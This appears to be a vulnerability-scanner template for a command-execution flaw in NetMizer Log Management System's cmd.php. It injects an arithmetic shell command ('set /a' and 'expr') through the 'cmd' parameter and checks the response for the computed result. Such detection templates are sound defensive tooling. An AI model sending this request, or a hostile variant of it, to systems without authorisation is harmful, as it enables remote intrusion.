id: poc-yaml-netmizer-log-manage-cmd-rce

info:
  name: NetMizer Log Management System cmd.php Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce

variables:
  t1: "{{rand_int(111000111000, 999000999000)}}"
  t2: "{{rand_int(10, 100)}}"
  t3: "{{to_number(t1) - to_number(t2)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/data/manage/cmd.php?cmd=set%20/a%20{{t1}}%20-%20{{t2}}%26expr%20{{t1}}%20-%20{{t2}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<pre>"
      - type: word
        part: body
        negative: true
        words:
          - "<html>"
      - type: regex
        part: body
        regex:
          - "{{t3}}"
